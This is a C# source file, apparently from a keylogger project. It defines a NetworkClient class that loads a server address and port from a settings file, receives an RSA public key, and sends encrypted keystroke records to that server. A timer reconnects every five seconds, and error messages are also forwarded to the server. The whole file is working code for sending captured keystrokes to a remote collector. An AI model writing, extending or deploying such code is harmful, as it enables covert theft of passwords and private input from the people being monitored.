using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using NKeyLoggerLib;

namespace NKeyLoggerClient;
internal class NetworkClient : ISender, IDisposable
{
    private Network client { get; set; } = new Network();
    private string url = "localhost";
    private int port = 56535;
    private readonly RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
    private readonly System.Timers.Timer reconnectTimer = new System.Timers.Timer(5000);
    public NetworkClient()
    {
        connect();
        initTimer();
    }

    public NetworkClient(string settingPath) {
        loadSettings(settingPath);
        connect();
        initTimer();
    }
    ~NetworkClient()
    {
        this.Dispose();
    }

    private void initTimer()
    {
        reconnectTimer.Elapsed += reconnect;
        reconnectTimer.Start();
    }
    public void loadSettings(string settingPath)
    {
        try
        {
            string[] lines = File.ReadAllLines(settingPath);
            foreach (string line in lines)
            {
                var elems = line.Split(' ');
                if (elems.First().ToLower() == "url" || elems.First().ToLower() == "ip")
                    url = elems[1].Trim();
                if (elems.First().ToLower() == "port")
                    port = int.Parse(elems[1].Trim());
            }
        }
        catch (Exception ex)
        {
            if (client.socket.Connected)
                client?.send(Encoding.UTF8.GetBytes(ex.Message), Network.Type.INFO);
        }
        connect();
    }

    private void reconnect(object? sender, System.Timers.ElapsedEventArgs e)
    {
        if(!client.socket.Connected)
            connect();
    }
    public void connect()
    {
        if (!client.socket.Connected)
            client = new Network();
        else {
            disconnect();
            client = new Network();
        }

        do
        {
            try
            {
                client.socket.Connect(url, port);
                List<byte> dataOpenKey = client.recv().Result.data;
                rsa.ImportRSAPublicKey(dataOpenKey?.ToArray(), out _ );
            }
            catch (SocketException){ }
        } while (!client.socket.Connected);
    }

    public void disconnect()
    {
        if ( !client.socket.Connected )
            return;
        client.Dispose();
    }

    public void Send(AbstractKeyInfo keyInfo)
    {
        try
        {
            if ( !client.socket.Connected )
                return;

            byte[] encData = rsa.Encrypt(keyInfo.GetBytes(), false);
            client.send(encData, Network.Type.KEY).Wait();
        }
        catch (Exception ex)
        {
            if(client.socket.Connected)
                client?.send(Encoding.UTF8.GetBytes(ex.Message), Network.Type.INFO);
        }
    }
    public void Dispose()
    {
        client.Dispose();
    }
}
